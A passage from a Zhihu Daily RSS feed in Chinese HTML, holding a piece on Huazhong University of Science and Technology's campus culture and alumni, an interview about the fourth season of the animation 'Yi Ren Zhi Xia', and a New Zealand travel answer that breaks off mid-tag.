data-original-src=\"v2-c9adfcc10d8587daf299eb71b30414ef\" data-watermark-src=\"v2-eb268415c73b340003a182ac8feb44e5\" data-private-watermark-src=\"v2-c1066a1db3b08fe4caafd76400d0cf4f\"></p>\n<p><br></p>\n<i><b></b></i><p><img src=\"https://pic3.zhimg.com/v2-2862d54bbeb15189366c27480c7fb5a8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"667\" data-watermark=\"original\" data-original-src=\"v2-2862d54bbeb15189366c27480c7fb5a8\" data-watermark-src=\"v2-12aa106dd9c68e744d8a8481f9aab1a0\" data-private-watermark-src=\"v2-9ca25168d57262423a7d91faeac994de\"></p>\n<p><br></p>\n<p><b><i>\" 理工男扎堆，华科却特别文艺 \"</i></b></p>\n<p><br></p>\n<p>从建校开始，华科就特别重视搞文艺</p>\n<p>每星期在电影场播放电影</p>\n<p>在学生食堂里举办舞会</p>\n<p>P.S. 虽然没多少女生参加，画风请自己脑补</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-f2b9746f3e6de1ea66019a86223a9eac_720w.webp?rss\" data-caption=\"△ // 1956年电影场刚建成，每场放映都人山人海。\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"870\" data-watermark=\"original\" data-original-src=\"v2-f2b9746f3e6de1ea66019a86223a9eac\" data-watermark-src=\"v2-34951cb82d277ba9093a8e40f8af0916\" data-private-watermark-src=\"v2-be800288c26683ca556993409aa6df4f\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-7a89967980f0e92a0f2f238917d83aa5_720w.webp?rss\" data-caption=\"△ // 当年的露天电影场现在已经变成了华科机械楼，但在大楼中间，学校仍然原址复建了电影场。\" data-size=\"normal\" data-rawwidth=\"700\" data-rawheight=\"469\" data-watermark=\"original\" data-original-src=\"v2-7a89967980f0e92a0f2f238917d83aa5\" data-watermark-src=\"v2-7f050e4ec8b28946bc7393b2f2d411b7\" data-private-watermark-src=\"v2-f2bf7c1f4a0fb4365ff22c1dafa55055\"></p>\n<p><br></p>\n<p>当然，文艺的自然环境也特别重要</p>\n<p>武大靠东湖的碧波远山给颜值加分</p>\n<p>华科只有一座喻家山那就干脆</p>\n<p><b>全！部！种！满！大！树！</b></p>\n<p><br></p>\n<p>树多，是华科的校园特色</p>\n<p>曾经森林覆盖率达到100%</p>\n<p>相当于，走在学校任何地方都能被树荫遮住</p>\n<p>火炉一样热的武汉夏天</p>\n<p>华科校园比武汉市区要凉快2℃</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0c543be165fe4c648d0664967a2ca841_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"852\" data-rawheight=\"509\" data-watermark=\"original\" data-original-src=\"v2-0c543be165fe4c648d0664967a2ca841\" data-watermark-src=\"v2-5f67e3664272796be65adeba0d6ba4d5\" data-private-watermark-src=\"v2-78a76e89490b80257eaea14b580bc395\"></p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c2c6d84a0ea1d734bcee98f009052b12_720w.webp?rss\" data-caption=\"△ // 1950年代的华科南一楼（上图）和老图书馆（下图）门前，树木还很稀疏。\" data-size=\"normal\" data-rawwidth=\"552\" data-rawheight=\"378\" data-watermark=\"original\" data-original-src=\"v2-c2c6d84a0ea1d734bcee98f009052b12\" data-watermark-src=\"v2-ebcea16f75011ac01cec6fc25502ecf1\" data-private-watermark-src=\"v2-1861a889e7875f3004f49cc00337c2ec\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-a84af27874c0756cedf42edce05de968_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1030\" data-rawheight=\"693\" data-watermark=\"original\" data-original-src=\"v2-a84af27874c0756cedf42edce05de968\" data-watermark-src=\"v2-7c611cf672d3cfb63cf3ae22896252fd\" data-private-watermark-src=\"v2-0c0fdcf74b0adafff32158bb7700628e\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0d28858a74a8aef6617053f61e268c35_720w.webp?rss\" data-caption=\"△ // 如今华科森林覆盖率72%，空中俯瞰全是绿树。\" data-size=\"normal\" data-rawwidth=\"1050\" data-rawheight=\"700\" data-watermark=\"original\" data-original-src=\"v2-0d28858a74a8aef6617053f61e268c35\" data-watermark-src=\"v2-8f52338bb5ad662bb5406e35ea47868f\" data-private-watermark-src=\"v2-17f65729f11fdc13d37034225216c579\"></p>\n<p><br></p>\n<p>从1950年代到1980年代</p>\n<p>朱九思校长倡导全体师生种树</p>\n<p>据说 “种树” 是必修课，不种树不能毕业</p>\n<p><b>学校每砍一棵树，都必须校长亲自签字</b></p>\n<p>也就是从那时沿袭下来的规矩</p>\n<p>如今华科校园里的许多大树，已经50多岁高龄</p>\n<p>因为飘絮而在武汉已经罕见踪迹的法国梧桐</p>\n<p>如今只在华科还能见到</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-dc479cbe072f9bad166acc6edd07fe5f_720w.webp?rss\" data-caption=\"△ // 朱九思校长。他主持华工三十多年，也和大树一样长寿，一直到2015年去世，享年100岁。\" data-size=\"normal\" data-rawwidth=\"986\" data-rawheight=\"656\" data-watermark=\"original\" data-original-src=\"v2-dc479cbe072f9bad166acc6edd07fe5f\" data-watermark-src=\"v2-5cb89a4d6784297d8e66f92d3610414f\" data-private-watermark-src=\"v2-7efd154f042332fc8f1a3b86d137ed34\"></p>\n<p><br></p>\n<p>1994年开始</p>\n<p>华科在全国高校中首次办起了“人文讲座”</p>\n<p>邀请全国各个学术领域的大咖来讲课</p>\n<p>相当于现在的“TED”、“一席”，特别火爆</p>\n<p>至今已经举办了2200多期</p>\n<p>在最火爆的时候，得提前三个小时以上占座</p>\n<p>否则连走廊台阶都挤不进去</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-780e90e83bb94d43eac0cfab6a618b02_720w.webp?rss\" data-caption=\"△ // 1995年“人文讲座”现场，倡导人文情怀的杨叔子校长被同学们热情围住。\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"504\" data-watermark=\"original\" data-original-src=\"v2-780e90e83bb94d43eac0cfab6a618b02\" data-watermark-src=\"v2-aeda47892c4139c416b627da3f4e8be4\" data-private-watermark-src=\"v2-6cd3f495a245864a4289742e27f9982c\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-6d02da9800a898c1b5d34ccec2c0be5e_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1050\" data-rawheight=\"700\" data-watermark=\"original\" data-original-src=\"v2-6d02da9800a898c1b5d34ccec2c0be5e\" data-watermark-src=\"v2-e93869a2bd709df0f44aa693c34d89d0\" data-private-watermark-src=\"v2-7ccf210f301c82d1f8505c4d13295ad4\"></p>\n<p><br></p>\n<p><b><i>\" 木讷闷骚的华科男</i></b></p>\n<p><b><i>是中国互联网创业圈的传奇 \"</i></b></p>\n<p><br></p>\n<p>归根到底</p>\n<p>华科最强大的标签莫过于“华科男”</p>\n<p>他们孤独闷骚</p>\n<p>像美剧《硅谷》《生活大爆炸》里的极客怪咖</p>\n<p>用直男癌的情商和爱因斯坦般的智商</p>\n<p>打开互联网世界的一百种可能性</p>\n<p>一夜之间，“华科系”成了中国创投圈的大热门</p>\n<p><br></p>\n<p>华科男的标配服装是</p>\n<p>格子衬衣、牛仔裤、塑料拖鞋或帆布鞋</p>\n<p>双肩包，左雨伞，右水杯</p>\n<p>坊间有个玩笑，说华科男大学四年里</p>\n<p>和异性说的最多的一句话是</p>\n<p>“阿姨，三两米饭，带走”</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-6bbd535a080142d453ff5a89f874715d_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-6bbd535a080142d453ff5a89f874715d\" data-watermark-src=\"v2-0e42fbcf8f73e772724dd5fbb07e9e2f\" data-private-watermark-src=\"v2-f0726227d6ba4fc24e4f105d4cef0e3c\"></p>\n<p><br></p>\n<p>华科男的孤独与闷骚</p>\n<p>成了他们绞尽脑汁创新的原始动力</p>\n<p>却一不小心，玩出了许多中国创业圈里的传奇</p>\n<p><br></p>\n<p>比如，曾有一大帮男生为了看球深夜翻院墙</p>\n<p>掀垮了一扇校门</p>\n<p>其中一个哥们儿想着</p>\n<p>干脆做一款能直播看球的软件吧</p>\n<p>2004年，休学的姚欣在韵苑26栋寝室写出了PPLive1.0 版本软件</p>\n<p>发布在校内白云黄鹤BBS 上</p>\n<p>一年之内，PPTV的用户超过了2亿</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-40585298f7116692c05c644a0c1c9fea_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-40585298f7116692c05c644a0c1c9fea\" data-watermark-src=\"v2-a46b2816b2d3cc6ec07d5beff195c08e\" data-private-watermark-src=\"v2-1a8e30a6c25f5c31d9028f95176d80b9\"></p>\n<p><br></p>\n<p>又比如</p>\n<p>华科姑娘们总在论坛上吐槽</p>\n<p>男朋友送的最多的礼物是实验室手工做的锤子</p>\n<p>恋爱谈得越久，收集的锤子种类就会越多</p>\n<p>恋爱情商几乎为零的华科男，往往被分手</p>\n<p>所以，刚分手的付小龙意识到</p>\n<p>得做一款帮助大家谈恋爱的软件</p>\n<p>于是“恋爱笔记APP”很快拿到了1000万融资</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-9ab5218456f177dd04b7aa029afbf361_720w.webp?rss\" data-caption=\"△ // 微信的开机界面，很好地解释了华科男“孤独又闷骚”的标签。张小龙曾说过，读书期间极不平衡的男女比例，是自己做社交产品的动力。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-9ab5218456f177dd04b7aa029afbf361\" data-watermark-src=\"v2-dfaf85ee5ddf958faf1c258939d5b8fb\" data-private-watermark-src=\"v2-3cd853513295249f293610fe2a1c4e63\"></p>\n<p><br></p>\n<p>除了微信、脸萌、Faceu、罗辑思维之类</p>\n<p>大家熟悉的东西诞生在华科男手里</p>\n<p>在中国的物理、航天、军事、医疗领域</p>\n<p>也有很多厉害的华科男</p>\n<p><br></p>\n<p>比如，去年第一艘国产航母下水</p>\n<p>它的副总设计师王硕威，是华科毕业的80后</p>\n<p>他是中国最年轻的航母设计师</p>\n<p>25岁就参与了辽宁号改装</p>\n<p><br></p>\n<p>华科被誉为中国创业圈的“黄埔军校”</p>\n<p><b>在遍布互联网创业公司的深圳</b></p>\n<p><b>华科被IT男们尊称为“小清华”</b></p>\n<p>曾经有一段时间，华为30%的员工都来自华科</p>\n<p>去年，雷军专程来武汉给小米招揽人才</p>\n<p>第一站就直奔华科，而不是母校武大</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-af25d908be110c6a2da9fb9ece86b243_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1050\" data-rawheight=\"699\" data-watermark=\"original\" data-original-src=\"v2-af25d908be110c6a2da9fb9ece86b243\" data-watermark-src=\"v2-a051b1ef4e913bb4e84922a47bb2e89e\" data-private-watermark-src=\"v2-aa71e10d68ca3954faa5b7a88cfa1d3d\"></p>\n<p><br></p>\n<p>从最古老的同济医学院开始算起</p>\n<p>华科的历史已经跨越百年</p>\n<p>从重组改名“华中科技大学”开始算起</p>\n<p>华科才刚刚21岁，正青春年少</p>\n<p><br></p>\n<p>这座相当于14座中山公园的庞大理工帝国</p>\n<p>在武汉东南郊低调蛰伏</p>\n<p>却凭着一代代 “华科男” 的脑力奋斗</p>\n<p>在中国互联网、科研领域独占一片天地</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-6a00d245ec2abdf3c76f1907ed9b94cc_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1050\" data-rawheight=\"699\" data-watermark=\"original\" data-original-src=\"v2-6a00d245ec2abdf3c76f1907ed9b94cc\" data-watermark-src=\"v2-3b9f6fe8526911bda6cc813a45cc5b61\" data-private-watermark-src=\"v2-9cfcd4f9da4a1e40cc72819fd924ae28\"></p>\n<p><br></p>\n<p>69年缓慢沉淀</p>\n<p>让喻家山大树参天</p>\n<p>也让华中科技大学变得枝繁叶茂</p>\n<p>“华科男” 成了一个标签</p>\n<p>贴在中国互联网创业浪潮的历史上</p>\n<p>在像硅谷一样不断诞生奇迹的光谷</p>\n<p>今天的华科也在继续上演着</p>\n<p>属于HUST的奇迹</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/hansyi-sheng-78?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">HANS汉声</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/485222477/answer/2109136436?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">111 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/432157399?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你所在的城市哪个景点是专供游客？本地人不去的？</a><br><a href=\"http://www.zhihu.com/question/321535568?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">哪个城市抬头就是风景，低头就是人生？</a><br>\n","link":"http://www.zhihu.com/question/485222477/answer/2109136436?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"国产动画《一人之下》第四季开播，你感觉如何？","date":"2021-09-24 05:36:31","description":"\n<p><b>1、《一人之下》第四季有大量新角色登场，能不能和大家分享一下，第四季在人物刻画上有没有什么特别的考量？</b></p>\n<p>感谢知乎的邀请。《一人之下》被粉丝喜爱的因素有很多，群像化式的杰出人物塑造是其中很重要的一点。《碧游村篇》部分的一大特点就是人物个性十分丰富，各类人设（包括龙套）总数超过70+。</p>\n<p> 所以我们在做的时候一个是尽量还原漫画，二是尽可能给角色加上表情细节。动画是动态的，需要把握角色并补完他状态之间的空白。因此，在刻画上表演上，我们尽量做到克制，不使人物偏离形象。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fac0392fc81acbcd20489acad87f2897_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1200\" data-rawheight=\"449\" data-watermark=\"watermark\" data-original-src=\"v2-fac0392fc81acbcd20489acad87f2897\" data-watermark-src=\"v2-465de15f05184b91f662fae84cd16c5d\" data-private-watermark-src=\"v2-fbee35a09aab0c3e379be75ae1a4b0e0\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-09e29c29746c1e24f2c1d35a3309a838_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"804\" data-watermark=\"watermark\" data-original-src=\"v2-09e29c29746c1e24f2c1d35a3309a838\" data-watermark-src=\"v2-cb6e1929b6ebc95a48ec904a25b97f6b\" data-private-watermark-src=\"v2-49dbe61f713ed381b316c1e5e84e78e8\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-965742c6d30e8897df92ea4be9a705df_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1200\" data-rawheight=\"523\" data-watermark=\"watermark\" data-original-src=\"v2-965742c6d30e8897df92ea4be9a705df\" data-watermark-src=\"v2-fcdd33f96b3bd4be3ba781da42871ee3\" data-private-watermark-src=\"v2-fb55cf55efe935444fb9bbb1c8d921c2\"></p>\n<p><b>2、在第四季中，大家对文戏非常期待，请问您是如何处理文戏部分的呈现的呢？</b></p>\n<p>本季最大的难点主要还是控制节奏。</p>\n<p>《碧游村篇》中有大量的叙述，此外，时间和空间的跨度也很广，同时角色引伸的潜台词也相当丰富。如果完全展现这些庞大的对白，一个是现在的时长恐怕很难撑住，第二个是独白和概念阐述的部分会非常非常的长。对此，我们认真做了案头工作，对部分文戏做了部分删减和重组，保证在不影响原内容的情况下使观影节奏更舒服一些。</p>\n<p><b>3、在《一人之下》第四季的制作中有没有遇到过瓶颈？又是如何克服的呢？</b></p>\n<p> 一定要说的话时间永远是瓶颈，这一点永远在克服。</p>\n<p>此外尺度的拿捏是很大的困难，完全不讲和照着漫画原样画出来都是不行的，只能想办法折中。</p>\n<p><b>4、《一人之下4》对楚岚的塑造，有哪些特别之处？</b></p>\n<p>张楚岚是我非常喜欢的角色，在造型上还是以保持漫画形象为第一优先。相对的，在性格上，张楚岚本季的表现的更成熟些。他的身份比起第2季开篇有一个巨大的转变，从“不摇碧莲”升级为了“操刀鬼”，外放性格收敛了许多，更多体现在对局势的判断上。</p>\n<p> 这一点上，我们在开篇做了重点处理，包括他发现本次任务是“来对了”，他发现的契机、微表情，我们都做了重点刻画。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-56b32e5faf7409ab64f09f0ca0007a87_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1200\" data-rawheight=\"461\" data-watermark=\"watermark\" data-original-src=\"v2-56b32e5faf7409ab64f09f0ca0007a87\" data-watermark-src=\"v2-d0fe76e0bbc5c0c99c9b8d877a799e42\" data-private-watermark-src=\"v2-c6746be0d7a45b15fad9a55ade44b5f6\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f88e91c732123e88b0003fe47371075d_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1840\" data-rawheight=\"787\" data-watermark=\"watermark\" data-original-src=\"v2-f88e91c732123e88b0003fe47371075d\" data-watermark-src=\"v2-8810ca0af5cc43b9e15e073aa5cc1b2b\" data-private-watermark-src=\"v2-a52a07bd48f5f542c3414d0b07f133ce\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-e0ea7a2aae8c413a8c368a5e0ac0a59f_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"804\" data-watermark=\"watermark\" data-original-src=\"v2-e0ea7a2aae8c413a8c368a5e0ac0a59f\" data-watermark-src=\"v2-dfcd10f315a02ccc4906b8e031f5dd40\" data-private-watermark-src=\"v2-f07d1762cb30471cd59386c604ed8fcd\"></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/shi-yi-14-51-37?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">十一</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/488660280/answer/2137142211?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">288 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/468563690?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《一人之下》八奇技中的神机百炼？</a><br><a href=\"http://www.zhihu.com/question/399121262?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">《一人之下》老天师杀那么多全性最终目的是不是为了保护张楚岚？</a><br>\n","link":"http://www.zhihu.com/question/488660280/answer/2137142211?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"哪次旅行让你感受到了宁静忘我的瞬间 ？","date":"2021-09-24 05:34:26","description":"\n<p>一辈子都会记得，在新西兰福克斯冰川小镇，坐在雪山湖泊边的那几分钟。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e0fcef08dbd32ddb51f17585d698bee2_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-e0fcef08dbd32ddb51f17585d698bee2\" data-watermark-src=\"v2-f94d43ded7b974c1f6e71147b206ff23\" data-private-watermark-src=\"v2-261e087f77521b5dd9f9d46785882311\"></p>\n<p>照片没能拍出眼睛看到的画面。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7c56dcf74373ab9d0f3e0a7110779644_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-7c56dcf74373ab9d0f3e0a7110779644\" data-watermark-src=\"v2-539db26d0b782b670aa37839502ed068\" data-private-watermark-src=\"v2-81e8391188ae589480b1658ba8b3149b\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-d7fb61e2d0860bed20ee5eceeca2d5f9_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-d7fb61e2d0860bed20ee5eceeca2d5f9\" data-watermark-src=\"v2-b8255f1ea7df5bec505b35a578b36a82\" data-private-watermark-src=\"v2-fb99e0b3086eaac81aba6883bc07e890\"></p>\n<p>真的像画，不仅仅是因为美，还因为静，到极致的那种静，有种神圣感。湖面几乎没有一丝波澜，所以这个湖被当地人叫「镜子湖」。</p>\n<p>需要从福克斯冰川小镇开车到一个徒步路线的入口，在原始森林里走上半个小时才能到。当你一直在视线狭窄的森林里穿行，突然拐个弯，这片湖就出现了。</p>\n<p>看到的时候，轻轻的哇了一声之后就再也不敢出声。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ef3b60f80dec2823342ddec2bbcb4a7f_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-ef3b60f80dec2823342ddec2bbcb4a7f\" data-watermark-src=\"v2-053e19b11b0b771d82c634b50b4cb391\" data-private-watermark-src=\"v2-66a60cd4d3537b9763bb60bca0ca6df6\"></p>\n<p>雪山、巍然不动的松树、没有一丝波澜的平静湖面，这个组合给人一种神圣感。周围的游客全都安静的坐着，有的安静的看，有的安静拍照，要说话也是超级轻声的耳语。</p>\n<p>后来回想，面对湖的那一刻，什么都没想，完全沉浸在自然中放空，感觉特别美妙。</p>\n<p>新西兰南岛真的是值得一去的地方。另一个宁静忘我的瞬间也是那里：米尔弗峡湾。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-bdbdc2d8f0b0231640514f2dcf2f28f2_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"652\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-bdbdc2d8f0b0231640514f2dcf2f28f2\" data-watermark-src=\"v2-1b56a8c22f83b00bdfbce1d9b97d9ea7\" data-private-watermark-src=\"v2-f7b77dd9821d2fee4f510aa4c7aaeb74\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-bb1a927c6e3201e0c1976656eed83b1e_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"960\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-bb1a927c6e3201e0c1976656eed83b1e\" data-watermark-src=\"v2-6380ca97b752e15e912b9661f8d86eca\" data-private-watermark-src=\"v2-3a4e9ec8cff494dd1fa13afe34fe2f9f\"></p>\n<p>到这个地方，船会停下来几分钟，这几分钟大家也都自发的不出声，一起感受自然的神圣美好。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6c20e8fc4ff9c987f600103bc88202f2_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"960\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-6c20e8fc4ff9c987f600103bc88202f2\" data-watermark-src=\"v2-3f2aff7876ea0a09fd7cee45b5722b36\" data-private-watermark-src=\"v2-9f0958b339ec9dc61e49fa5ac7454bf2\"></p>\n<p>有一次突然听到巴赫的【哥德堡变奏曲】，就想，下次一定会带到米尔弗峡湾，在甲板上，带上耳机听一次。</p>\n<p>超美的瓦纳卡湖边的教堂。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3ffed61664b71bcbff753e0cae467cab_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-3ffed61664b71bcbff753e0cae467cab\" data-watermark-src=\"v2-2898aa0f014fb7f8db2ca10efd372d64\" data-private-watermark-src=\"v2-7f0663f85b7c3e27ea95ebfb1592b3ba\"></p>\n<p>晚上的教堂也像童话。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8bf7dbcc419648f881b56041cb3992d8_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-8bf7dbcc419648f881b56041cb3992d8\" data-watermark-src=\"v2-8f7e9dc332fff7ddea182bf0b0bbaa09\" data-private-watermark-src=\"v2-78e679dff87e111f33e8dc1c91ff1402\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-bfa3c4821977c5f85db6ddaf484cd570_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-bfa3c4821977c5f85db6ddaf484cd570\" data-watermark-src=\"v2-03c530e8ddc57c5b507435bb813a4ec1\" data-private-watermark-src=\"v2-4ba7d55977533c35afd4baa10298ab9e\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-8b02128bccf9bb70bb2dbc736abe82c9_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-8b02128bccf9bb70bb2dbc736abe82c9\" data-watermark-src=\"v2-b658b94b7e8980dcd4919f2c50099134\" data-private-watermark-src=\"v2-05b0183a970d5643eb1b19d6024aa580\"></p>\n<p>看美景看嗨的两个人。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-82308d7b023be3fdc2182a1f286d7942_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-82308d7b023be3fdc2182a1f286d7942\" data-watermark-src=\"v2-cc4def93ae8ce72cebc5314d6c897219\" data-private-watermark-src=\"v2-0926b3fdaa62c61937541eb849497af8\"></p>\n<p>路上遇见的火烧云。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4cce1f9302338cea8d4291838b55efc3_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-4cce1f9302338cea8d4291838b55efc3\" data-watermark-src=\"v2-4cf1eed249cbb3cdd3fd2cbfaf7f885b\" data-private-watermark-src=\"v2-c59ee7f85bfdfabd1cd02474d75b9e12\"></p>\n<p>阿司匹林国家公园附近的一条河。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-37af94e5d88e40fa48cc5ea31206b257_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"844\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-37af94e5d88e40fa48cc5ea31206b257\" data-watermark-src=\"v2-80513dce7b5f161d992cb3aac1b0f4f4\" data-private-watermark-src=\"v2-cefb463cc1eacdad030478c6c0e364d5\"></p>\n<p>普卡基湖。</p>\n<p>颜色太不真实了，也在湖边安静的坐了一下午。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-39530f48e83acca3c90446f91f795060_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-39530f48e83acca3c90446f91f795060\" data-watermark-src=\"v2-ea567e9b8f8dd46a9f0e592785851e5a\" data-private-watermark-src=\"v2-8875ff6e69c27e5af3f354d4e2d9d3e9\"></p>\n<p>但尼丁也是一个超棒的城市。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-104ecd6c9f95ff0e466a29fe4b5551da_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-104ecd6c9f95ff0e466a29fe4b5551da\" data-watermark-src=\"v2-8c92ffa9df6c4713f0717350611ab64f\" data-private-watermark-src=\"v2-7e00c83031e84a82078241b24a1ca35b\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2b790d02598556c4fb00cc7da03f9710_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-2b790d02598556c4fb00cc7da03f9710\" data-watermark-src=\"v2-879b89f36b0e9855ff7ba09fe710509e\" data-private-watermark-src=\"v2-e5cc9e22f2992058d9930d512460cb62\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-1a0d7be67f2b76b1b7578ac6d7fa8c99_720w.jpg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-1a0d7be67f2b76b1b7578ac6d7fa8c99\" data-watermark-src=\"v2-e335dab60c0bef524f8ac5cab1f2c448\" 